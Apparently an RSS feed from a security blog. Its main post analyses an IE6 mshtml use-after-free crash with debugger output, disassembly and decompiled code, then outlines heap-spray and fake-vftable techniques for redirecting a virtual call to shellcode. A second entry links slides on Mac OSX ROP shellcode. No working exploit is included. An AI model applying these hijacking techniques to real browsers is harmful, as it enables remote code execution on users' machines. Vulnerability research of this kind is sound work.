.aboutproduct{width:530px;height:auto;text-align:justify;line-height:18px;float:left;font-family:arial;color:#333;margin-bottom:10px;padding:0 5px 5px 13px}


</pre>
</div>The program crashes on IE 6 with the following exception.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:120px;">(914.8fc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=04cb4740 ebx=00000000 ecx=04cb4740 edx=04b80bfc esi=04cd8b40 edi=00080000
eip=7d51f463 esp=0013e5a4 ebp=0013e5f0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
mshtml!CDispNode::GetRootNode+0x6:
7d51f463 8b4808          mov     ecx,dword ptr [eax+8] ds:0023:04cb4748=????????</pre>
</div><br />
The Backtrace. <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:288px;">0:000&gt; knL
 # ChildEBP RetAddr  
00 0013b478 7d54f5c0 mshtml!CDispNode::GetDispRoot+0x12
01 0013b4bc 7d55118b mshtml!CDispNode::ReplaceNode+0xdb
02 0013b50c 7d50b3ad mshtml!CLayout::EnsureDispNodeCore+0x348
03 0013b5bc 7d688af4 mshtml!CLayout::EnsureDispNode+0x5a
04 0013b7f0 7d5b170b mshtml!CFlowLayout::CalcSizeCoreCSS1Strict+0x3ff
05 0013b808 7d50a136 mshtml!CFlowLayout::CalcSizeCore+0x2f
06 0013b840 7d5069d1 mshtml!CFlowLayout::CalcSizeVirtual+0x17e
07 0013b954 7d539257 mshtml!CLayout::CalcSize+0x224
08 0013b9c8 7d539def mshtml!CFlowLayout::MeasureSite+0x1e5
09 0013ba0c 7d539d26 mshtml!CFlowLayout::GetSiteWidth+0x12b
0a 0013ba38 7d6ca5e3 mshtml!CLSMeasurer::GetSiteWidth+0x80
0b 0013bb44 7d5befb2 mshtml!CRecalcLinePtr::AlignObjects+0x30b
0c 0013bbc4 7d5136e0 mshtml!CRecalcLinePtr::CalcAlignedSitesAtBOLCore+0x1d7
0d 0013bc14 7d514345 mshtml!CRecalcLinePtr::CalcAlignedSitesAtBOL+0xa9
0e 0013bcc8 7d5131cd mshtml!CRecalcLinePtr::MeasureLine+0x384
0f 0013c084 7d5114a5 mshtml!CDisplay::RecalcLinesWithMeasurer+0x502
10 0013c204 7d506252 mshtml!CDisplay::RecalcLines+0x67
11 0013c21c 7d506529 mshtml!CDisplay::RecalcView+0x6b
12 0013c2c4 7d689582 mshtml!CFlowLayout::CalcTextSize+0x2ee
13 0013c4fc 7d5b170b mshtml!CFlowLayout::CalcSizeCoreCSS1Strict+0xe8d</pre>
</div>Disassembly of the crashed function:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:108px;">mshtml!CDispNode::GetRootNode+0x6:
7d51f463 8b4808          mov     ecx,dword ptr [eax+8]
7d51f466 85c9            test    ecx,ecx
7d51f468 7404            je      mshtml!CDispNode::GetRootNode+0xd (7d51f46e)
7d51f46a 8bc1            mov     eax,ecx
7d51f46c ebf5            jmp     mshtml!CDispNode::GetRootNode+0x6 (7d51f463)
7d51f46e c3              ret</pre>
</div>The entire code flow is as follows.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:360px;">mshtml!CDispNode::GetDispRoot:
7d51f437 8bff            mov     edi,edi
7d51f439 56              push    esi
7d51f43a e822000000      call    mshtml!CDispNode::GetRootNode (7d51f461)
7d51f43f 8bf0            mov     esi,eax
7d51f441 85f6            test    esi,esi
7d51f443 0f84c1020000    je      mshtml!CDispNode::GetDispRoot+0x1d (7d51f70a)
7d51f449 8b06            mov     eax,dword ptr [esi]
7d51f44b 8bce            mov     ecx,esi
7d51f44d ff5034          call    dword ptr [eax+34h]
7d51f450 85c0            test    eax,eax
7d51f452 0f84b2020000    je      mshtml!CDispNode::GetDispRoot+0x1d (7d51f70a)
7d51f458 8bc6            mov     eax,esi
7d51f45a 5e              pop     esi
7d51f45b c3              ret
7d51f45c 90              nop
7d51f45d 90              nop
7d51f45e 90              nop
7d51f45f 90              nop
7d51f460 90              nop
mshtml!CDispNode::GetRootNode:
7d51f461 8bc1            mov     eax,ecx
7d51f463 8b4808          mov     ecx,dword ptr [eax+8] ds:0023:04cb4748=????????
7d51f466 85c9            test    ecx,ecx
7d51f468 7404            je      mshtml!CDispNode::GetRootNode+0xd (7d51f46e)
7d51f46a 8bc1            mov     eax,ecx
7d51f46c ebf5            jmp     mshtml!CDispNode::GetRootNode+0x6 (7d51f463)
7d51f46e c3              ret</pre>
</div><u>The C equivalent code:<br />
</u><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">int&nbsp;__thiscall&nbsp;CElement__GetParentAncestorSafe</span><span style="color: #007700">(</span><span style="color: #0000BB">int&nbsp;this</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">int&nbsp;a2</span><span style="color: #007700">)<br />{<br />&nbsp;&nbsp;</span><span style="color: #0000BB">int&nbsp;result</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;eax@1<br />&nbsp;&nbsp;</span><span style="color: #0000BB">int&nbsp;v3</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;ecx@1<br />&nbsp;&nbsp;</span><span style="color: #0000BB">int&nbsp;v4</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;ecx@2<br /><br />&nbsp;&nbsp;</span><span style="color: #0000BB">v3&nbsp;</span><span style="color: #007700">=&nbsp;*(</span><span style="color: #0000BB">_DWORD&nbsp;</span><span style="color: #007700">*)(</span><span style="color: #0000BB">this&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">16</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">result&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />&nbsp;&nbsp;if&nbsp;(&nbsp;</span><span style="color: #0000BB">v3&nbsp;</span><span style="color: #007700">)<br />&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">=&nbsp;*(</span><span style="color: #0000BB">_DWORD&nbsp;</span><span style="color: #007700">*)(</span><span style="color: #0000BB">v3&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">4</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;do<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*(</span><span style="color: #0000BB">_BYTE&nbsp;</span><span style="color: #007700">*)(</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">8</span><span style="color: #007700">)&nbsp;==&nbsp;</span><span style="color: #0000BB">a2&nbsp;</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">=&nbsp;*(</span><span style="color: #0000BB">_DWORD&nbsp;</span><span style="color: #007700">*)(</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">4</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(&nbsp;</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">result&nbsp;</span><span style="color: #007700">=&nbsp;*(</span><span style="color: #0000BB">_DWORD&nbsp;</span><span style="color: #007700">*)</span><span style="color: #0000BB">v4</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">result</span><span style="color: #007700">;<br />}<br /><br />/(</span><span style="color: #0000BB">7D51F437</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">void&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">__thiscall&nbsp;CDispNode__GetDispRoot</span><span style="color: #007700">(</span><span style="color: #0000BB">void&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">this</span><span style="color: #007700">)<br />{<br />&nbsp;&nbsp;</span><span style="color: #0000BB">void&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">v1</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;eax@1<br />&nbsp;&nbsp;</span><span style="color: #0000BB">void&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">v2</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;esi@1<br />&nbsp;&nbsp;</span><span style="color: #0000BB">void&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">result</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;eax@3<br /><br />&nbsp;&nbsp;</span><span style="color: #0000BB">v1&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">CDispNode__GetRootNode</span><span style="color: #007700">(</span><span style="color: #0000BB">this</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">v2&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">v1</span><span style="color: #007700">;<br />&nbsp;&nbsp;if&nbsp;(&nbsp;</span><span style="color: #0000BB">v1&nbsp;</span><span style="color: #007700">&amp;&amp;&nbsp;(*(</span><span style="color: #0000BB">int&nbsp;</span><span style="color: #007700">(</span><span style="color: #0000BB">__thiscall&nbsp;</span><span style="color: #007700">**)(</span><span style="color: #0000BB">_DWORD</span><span style="color: #007700">))(*(</span><span style="color: #0000BB">_DWORD&nbsp;</span><span style="color: #007700">*)</span><span style="color: #0000BB">v1&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">52</span><span style="color: #007700">))(</span><span style="color: #0000BB">v1</span><span style="color: #007700">)&nbsp;)<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">result&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">v2</span><span style="color: #007700">;<br />&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">result&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">result</span><span style="color: #007700">;<br />}&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div><br />
The program crashes due to a use after free issue.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:48px;">&gt;u 7d51f463 
7d51f463 8b4808          mov     ecx,dword ptr [eax+8]</pre>
</div>Here EAX is pointer to an Object element and ECX to the vftable. Here the object pointed to by the Vftable is freed, and there by the memory location pointed by EAX.<br />
<br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:84px;">0:000&gt; d 04cb4748
04cb4748  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
04cb4758  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
04cb4768  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
04cb4778  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??    ????????????????</pre>
</div><br />
If you look at the next instructions , we notice the following .<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:84px;">7d51f466 85c9            test    ecx,ecx 
7d51f468 7404            je      mshtml!CDispNode::GetRootNode+0xd (7d51f46e)
7d51f46a 8bc1            mov     eax,ecx
7d51f46c ebf5            jmp     mshtml!CDispNode::GetRootNode+0x6 (7d51f463)
7d51f46e c3              ret</pre>
</div>The Pesudo Code:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:348px;">ecx = dword ptr[ eax+8 ] 
 
if (ecx ==0):
          
 -7d51f46e: return(eax)  to 7d51f43f [calling module]
|
|  else:
|      loop()
|
|-&gt;  and at:7d51f43f  

{


 mov     esi,eax <font color="#800000"> &lt;-- value of eax returned form the above function</font>
  test    esi,esi    <font color="#800000">&lt;-- if (esi) ==0  take jmp</font>
 je      mshtml!CDispNode::GetDispRoot+0x1d (7d51f70a)


 mov     eax,dword ptr [esi]  ds:0023:04ca1d40=
               <font color="#800000">&lt;-- move to eax data pointed by esi</font>


 mov     ecx,esi  <font color="#800000">&lt;-- not usefull </font>
 call    dword ptr [eax+34h] <font color="#800000">&lt;-- call adress pointed by eax+34h</font>

}</pre>
</div>So if we can make  { mov     ecx,dword ptr [eax+8]  }point to the heap such a way that EAX+8 contains [00000000] and EAX contains a adress we control , we would have code execution. We can initialize this area using heap spray. <br />
<br />
What I did was arranged my HTML tags such a way that it would leave a lot of garbage values mainly null in the EAX pointed memory, and then the program would crash at the call instruction. This is never the right way of doing nor reliable, but it was working fine for me. <br />
<br />
Now we could take control of the program here.           <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">7d51f44d ff5034          call    dword ptr [eax+34h]</pre>
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:144px;">(36c.440): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=01c53380 ecx=01c3e6e0 edx=000000a4 esi=01c3e6e0 edi=01c071f4
eip=7d51f44d esp=0013b478 ebp=0013b4bc iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
mshtml!CDispNode::GetDispRoot+0x12:
7d51f44d ff5034          call    dword ptr [eax+34h]  ds:0023:00000034=????????
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.</pre>
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:168px;">mshtml!CDispNode::GetDispRoot:
7d51f437 8bff            mov     edi,edi
7d51f439 56              push    esi
7d51f43a e822000000      call    mshtml!CDispNode::GetRootNode (7d51f461)
7d51f43f 8bf0            mov     esi,eax
7d51f441 85f6            test    esi,esi
7d51f443 0f84c1020000    je      mshtml!CDispNode::GetDispRoot+0x1d (7d51f70a)
7d51f449 8b06            mov     eax,dword ptr [esi]
7d51f44b 8bce            mov     ecx,esi
7d51f44d ff5034          call    dword ptr [eax+34h]  ds:0023:00000034=????????
7d51f450 85c0            test    eax,eax
7d51f452 0f84b2020000    je      mshtml!CDispNode::GetDispRoot+0x1d (7d51f70a)</pre>
</div><font color="#800000">7d51f449 8b06            mov     eax,dword ptr [esi]<br />
</font><br />
Move DWORD (a 32-bit/4-byte value) in memory location specified by ESI[01c3e6e0]--&gt;&quot;00000000&quot; into register EAX, so EAX becomes [00000000]<br />
<br />
<font color="#800000">7d51f44d ff5034          call    dword ptr [eax+34h]  <br />
<br />
</font>The crash is at a virtual Call with [Register + offset ] . The Vftable is in eax + offset[34h] the adress of function to be executed . In this case it would be 13th entry in the table. Now that it's pointing to [00000000] the program crashes. <br />
<br />
We can take control of the program  here and have code execution, for that we need to find the type of object that was freed and the no of bytes that was allocated . Knowing these details we would be able to build fake objects of that size using JS . So that a the call at 7d51f463 [eax+8]  would land on our crafted Vftable object and return [00000000] and <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;"><font color="#800000">7d51f463 8b4808          mov     ecx,dword ptr [eax+8]</font></pre>
</div> a call to <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;"><font color="#800000">7d51f44d ff5034 call dword ptr [eax+34h]</font></pre>
</div>Vftable+34h would make the program land on our shellcode.  <br />
<br />
There are <a href="http://projects.wox-xion.ch/epfl/cmu2011/19-601/paper1.pdf" target="_blank">couple</a> of ways to exploit this a good reference would be <a href="http://www.blackhat.com/presentations/bh-usa-07/Afek/Whitepaper/bh-usa-07-afek-WP.pdf" target="_blank">this</a>.<br />
<br />
<u><b>1) The double reference exploit</b></u><br />
<br />
<br />
<u>Requirements:</u> <br />
<br />
A controllable VFTable pointer.<br />
<br />
<u>Method:</u><br />
<br />
Our own code is placed in the deallocated object or some where in the memory where we could point to via Vftable.<br />
<br />
Then we replace the VFTable pointer by one which points to some memory<br />
later we will use this as VFTable pointing back to where we put our code.<br />
<br />
<a href="http://projects.wox-xion.ch/epfl/cmu2011/19-601/paper1.pdf" target="_blank">source</a>:<br />
<br />
<u><b>2) The VFTable exploit</b></u><br />
<br />
<u>Requirements:<br />
<br />
</u><br />
A controllable VFTable .<br />
<u>Method:</u><br />
Our code is injected in the VFTable which is made to point to itself.<br />
<br />
<u>Depends:<br />
</u><br />
This this achieved by the system allocation process.<br />
<br />
<u><b>The Lookaside exploit<br />
<br />
</b>Requirements: </u><br />
<br />
A controllable heap allocation / heap deallocation cycle. <br />
<br />
<u>Method:<br />
</u><br />
<br />
Since the system reallocates a freed memory , we craft the code in such a way that when reallocation takes place our injected code is used in the reallocation cycle. <br />
<br />
Read More: <a href="http://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf" target="_blank">http://www.blackhat.com/presentation...irov-apr19.pdf</a><br />
Read in detail here a similar approach <a href="http://securityevaluators.com/files/papers/isewoot08.pdf" target="_blank">http://securityevaluators.com/files/.../isewoot08.pdf</a><br />
<br />
<br />
For choosing an appropriate method for exploitation we need determine what all we control in the current scenario and understand more about the crash. We can either use the debugger for this purpose or reverse engineer the current code to figure out those details.<br />
<br />
*Thanks to w3devil and Zarul for proof reading the doc<br />
<br />
<br />
Cheers. <br />
<br />
<br />
<b>References on Heap : <br />
</b><br />
 <a href="http://www.tenouk.com/ModuleZ.html" target="_blank">A practical C storage class scope and memory allocation programming online training - C language references, working program examples, source code and memory related function library</a><br />
<a href="http://en.wikipedia.org/wiki/Data_segment" target="_blank">Data segment - Wikipedia, the free encyclopedia</a><br />
<a href="http://en.wikipedia.org/wiki/Code_segment" target="_blank">Memory segmentation - Wikipedia, the free encyclopedia</a><br />
<a href="http://en.wikipedia.org/wiki/.bss" target="_blank">.bss - Wikipedia, the free encyclopedia</a><br />
<a href="http://www.geeksforgeeks.org/archives/14268" target="_blank">Memory Layout of C Programs - GeeksforGeeks | GeeksforGeeks</a><br />
<a href="http://code.google.com/p/gperftools/?redir=1" target="_blank">gperftools - Fast, multi-threaded malloc() and nifty performance analysis tools - Google Project Hosting</a><br />
<a href="http://www.h-online.com/security/features/A-Heap-of-Risk-747220.html" target="_blank">A Heap of Risk - The H Security: News and Features</a><br />
<a href="http://x9090.blogspot.in/2010/03/tutorial-exploit-writting-tutorial-from.html" target="_blank">http://x9090.blogspot.in/2010/03/tut...rial-from.html</a><br />
<a href="http://en.wikibooks.org/wiki/C_Programming/C_Reference/stdlib.h/malloc#Use_after_free" target="_blank">http://en.wikibooks.org/wiki/C_Progr...Use_after_free</a><br />
<a href="http://www.quora.com/Why-is-dynamic-memory-allocation-called-heap-memory-allocation" target="_blank">http://www.quora.com/Why-is-dynamic-...ory-allocation</a><br />
<a href="http://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/" target="_blank">http://eli.thegreenplace.net/2011/09...out-on-x86-64/</a><br />
<br />
Exploitation References :<br />
<a href="http://d0cs4vage.blogspot.in/2011/06/insecticides-dont-kill-bugs-patch.html" target="_blank">http://d0cs4vage.blogspot.in/2011/06...ugs-patch.html</a><br />
<a href="http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html" target="_blank">http://www.phreedom.org/research/hea...feng-shui.html</a><br />
<a href="http://securityevaluators.com/files/papers/isewoot08.pdf" target="_blank">http://securityevaluators.com/files/.../isewoot08.pdf</a><br />
<a href="http://www.exploit-monday.com/2011_11_13_archive.html" target="_blank">http://www.exploit-monday.com/2011_11_13_archive.html</a><br />
<a href="http://www.blackhat.com/presentations/bh-usa-09/MCDONALD/BHUSA09-McDonald-WindowsHeap-PAPER.pdf" target="_blank">www.blackhat.com/presentations/bh-usa-09/MCDONALD/BHUSA09-McDonald-WindowsHeap-PAPER.pdf</a><br />
<a href="http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html" target="_blank">http://www.phreedom.org/research/hea...feng-shui.html</a><br />
<a href="http://www.thegreycorner.com/2010/01/heap-spray-exploit-tutorial-internet.html" target="_blank">http://www.thegreycorner.com/2010/01...-internet.html</a><br />
<a href="https://www.owasp.org/images/0/01/OWASL_IL_2010_Jan_-_Moshe_Ben_Abu_-_Advanced_Heapspray.pdf" target="_blank">https://www.owasp.org/images/0/01/OW..._Heapspray.pdf</a><br />
<a href="https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/#Visualizing_the_heap_spray_8211_IE6" target="_blank">https://www.corelan.be/index.php/201...spray_8211_IE6</a><br />
<a href="http://www.blackhat.com/presentations/bh-usa-07/Afek/Whitepaper/bh-usa-07-afek-WP.pdf" target="_blank">http://www.blackhat.com/presentation...07-afek-WP.pdf</a><br />
<a href="http://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf" target="_blank">http://www.blackhat.com/presentation...irov-apr19.pdf</a><br />
<a href="http://www.exploit-monday.com/2011/07/post-mortem-analysis-of-use-after-free_07.html" target="_blank">http://www.exploit-monday.com/2011/0...r-free_07.html</a><br />
<a href="http://www.vupen.com/blog/20120116.Advanced_Exploitation_of_ProFTPD_Remote_Use_after_free_CVE-2011-4130_Part_II.php" target="_blank">http://www.vupen.com/blog/20120116.A...30_Part_II.php</a><br />
<br />
<br />
Protection Mechanisms:<br />
<a href="http://robert.ocallahan.org/2010/10/mitigating-dangling-pointer-bugs-using_15.html" target="_blank">http://robert.ocallahan.org/2010/10/...-using_15.html</a></blockquote>

]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=517</guid>
		</item>
		<item>
			<title>Max OSX 64 bit ROP Payloads.</title>
			<link>http://garage4hackers.com/entry.php?b=520</link>
			<pubDate>Sat, 27 Oct 2012 18:08:20 GMT</pubDate>
			<description>6 Months back I did a presentation on *Mac OSX 64 bit ROP shellcodes* at Null Monthly...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">6 Months back I did a presentation on <b>Mac OSX 64 bit ROP shellcodes</b> at <a href="https://groups.google.com/forum/?fromgroups=#!searchin/null-co-in/&#91;null]&#91;Meet]&#91;Pune]$2019th$20May$202012$20@SICSR" target="_blank">Null Monthly</a> meet,  where I took two different session explaining 64 bit architecture in detail and Mac OSX 64 Rop Shellcode. Today I was browsing through some old stuffs and came across the PPT I used back then. The slides only contains the first day's presentation and I can't find the second days PPT :rolleyes: . <br />
<br />
Am sharing it over here. <b>There is nothing new</b>.<br />
<br />
<a href="http://www.slideshare.net/RahulSasi2/mac-osx-64ropchains" target="_blank">http://www.slideshare.net/RahulSasi2...sx-64ropchains</a><br />
<br />
Cheers.</blockquote>

]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=520</guid>
		</item>
	</channel>
</rss>
